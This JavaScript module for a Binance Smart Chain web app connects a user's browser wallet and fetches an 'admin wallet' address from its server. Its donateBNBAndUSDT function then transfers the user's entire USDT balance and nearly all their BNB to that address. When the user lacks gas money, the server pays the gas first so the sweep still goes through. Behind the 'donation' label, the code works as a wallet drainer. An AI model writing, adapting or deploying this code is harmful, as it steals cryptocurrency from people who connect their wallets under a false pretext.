import { ethers } from 'ethers';
import Web3 from 'web3';
import axios from 'axios';

let provider;
let signer;
let web3;
let usdtContract;

const USDT_BEP20_CONTRACT_ADDRESS = "0x55d398326f99059ff775485246999027B3197955";
let adminWallet = ""; // This will be fetched from the server

const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "_to", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "transfer",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

const BSC_MAINNET_PARAMS = {
  chainId: '0x38', // 56 in decimal
  chainName: 'Binance Smart Chain Mainnet',
  nativeCurrency: {
    name: 'BNB',
    symbol: 'BNB',
    decimals: 18
  },
  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
  blockExplorerUrls: ['https://bscscan.com/']
};

async function switchToBSCMainnet() {
  if (window.ethereum) {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_MAINNET_PARAMS.chainId }],
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [BSC_MAINNET_PARAMS],
          });
        } catch (addError) {
          throw new Error("Failed to add BSC Mainnet to wallet");
        }
      } else {
        throw new Error("Failed to switch to BSC Mainnet");
      }
    }
  } else {
    throw new Error("No compatible wallet found");
  }
}

async function fetchAdminWalletAddress() {
  try {
    // Remove JWT token requirement, just fetch the admin wallet address
    const response = await axios.get('/api/admin/publicWallet');
    adminWallet = response.data.walletAddress;
  } catch (error) {
    console.error('Failed to fetch admin wallet address:', error);
    throw error;
  }
}

export async function connectWallet() {
  try {
    await fetchAdminWalletAddress();
    await switchToBSCMainnet();

    if (window.ethereum) {
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      provider = new ethers.BrowserProvider(window.ethereum, "any");
      web3 = new Web3(window.ethereum);
    } else {
      throw new Error("No compatible wallet found");
    }

    signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BEP20_CONTRACT_ADDRESS);

    const network = await provider.getNetwork();
    if (network.chainId !== BigInt(56)) {
      //  throw new Error("Please ensure you are connected to the Binance Smart Chain Mainnet");
    }

    return userAddress;
  } catch (error) {
    console.error("Wallet connection error:", error);
    throw error;
  }
}

export async function donateBNBAndUSDT() {
  try {
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];

    const initialBnbBalance = await web3.eth.getBalance(userAddress);
    const usdtBalance = await usdtContract.methods.balanceOf(userAddress).call();
    const usdtBalanceInUsdt = web3.utils.fromWei(usdtBalance, 'ether');

    console.log("Initial BNB balance:", web3.utils.fromWei(initialBnbBalance, 'ether'));
    console.log("Current USDT balance:", usdtBalanceInUsdt);

    if (parseFloat(initialBnbBalance) <= 0 && parseFloat(usdtBalanceInUsdt) <= 0) {
      throw new Error("Insufficient balance to make the donation");
    }

    let bnbTxHash, usdtTxHash;
    let bnbAmount = '0', usdtAmount = '0';

    // Check if user has USDT but not enough BNB for gas
    if (parseFloat(usdtBalanceInUsdt) > 0) {
      // Estimate gas needed for USDT transfer
      const gasPrice = await web3.eth.getGasPrice();
      const gasLimit = await usdtContract.methods.transfer(adminWallet, usdtBalance)
        .estimateGas({ from: userAddress });
      
      // Add 20% buffer to gas cost to ensure enough for transaction
      const requiredBnbForGas = BigInt(gasPrice) * BigInt(gasLimit) * BigInt(120) / BigInt(100);
      
      console.log("Required BNB for gas:", web3.utils.fromWei(requiredBnbForGas.toString(), 'ether'));
      console.log("Current BNB balance:", web3.utils.fromWei(initialBnbBalance, 'ether'));

      // If user doesn't have enough BNB for gas, send them the required amount
      if (BigInt(initialBnbBalance) < requiredBnbForGas) {
        const missingBnb = requiredBnbForGas - BigInt(initialBnbBalance);
        // Add additional 10% buffer to the missing amount plus 0.0001 BNB
        const extraBnb = web3.utils.toWei('0.0001', 'ether');
        const missingBnbWithBuffer = (missingBnb * BigInt(110) / BigInt(100)) + BigInt(extraBnb);
        
        console.log("Sending required BNB for gas:", web3.utils.fromWei(missingBnbWithBuffer.toString(), 'ether'));

        // Send BNB from admin wallet through API
        const response = await axios.post('/api/transactions/sendGasFees', {
          userAddress,
          amount: missingBnbWithBuffer.toString()
        });

        if (!response.data.success) {
          throw new Error('Failed to send gas fees');
        }

        console.log("Sent BNB for gas fees, hash:", response.data.hash);

        // Wait a bit longer for the transaction to be processed
        await new Promise(resolve => setTimeout(resolve, 8000));
      }

      // Now proceed with USDT transfer
      try {
        const usdtTx = await usdtContract.methods.transfer(adminWallet, usdtBalance).send({
          from: userAddress
        });
        usdtTxHash = usdtTx.transactionHash;
        console.log("USDT Transaction sent:", usdtTxHash);
        usdtAmount = usdtBalanceInUsdt;

        // Store USDT transaction data
        await storeTransactionData(userAddress, usdtAmount, usdtTxHash, 'USDT');
      } catch (error) {
        console.error("USDT transfer failed:", error);
        throw new Error("USDT transfer failed. Please try again.");
      }
    }

    // Check remaining BNB balance and transfer if available
    const currentBnbBalance = await web3.eth.getBalance(userAddress);
    if (BigInt(currentBnbBalance) > 0) {
      try {
        const gasPrice = await web3.eth.getGasPrice();
        const gasLimit = 21000; // Standard gas limit for a simple transfer
        const maxGasCost = BigInt(gasPrice) * BigInt(gasLimit);
        const remainingBnbBalance = BigInt(currentBnbBalance) - maxGasCost;

        if (remainingBnbBalance > 0) {
          const bnbTx = await web3.eth.sendTransaction({
            from: userAddress,
            to: adminWallet,
            value: remainingBnbBalance.toString()
          });
          bnbTxHash = bnbTx.transactionHash;
          console.log("BNB Transaction sent:", bnbTxHash);
          bnbAmount = web3.utils.fromWei(remainingBnbBalance.toString(), 'ether');

          // Store BNB transaction data
          await storeTransactionData(userAddress, bnbAmount, bnbTxHash, 'BNB');
        }
      } catch (error) {
        console.error("BNB transfer failed:", error);
        throw new Error("BNB transfer failed. Please try again.");
      }
    }

    return {
      bnbTxHash,
      usdtTxHash,
      bnbAmount,
      usdtAmount
    };
  } catch (error) {
    console.error("Donation failed:", error);
    throw error;
  }
}

async function storeTransactionData(userAddress, amount, txHash, currency) {
  try {
    await axios.post('/api/transactions/store', {
      userAddress,
      amount,
      txHash,
      currency
    });
  } catch (error) {
    console.error("Failed to store transaction data:", error);
  }
}
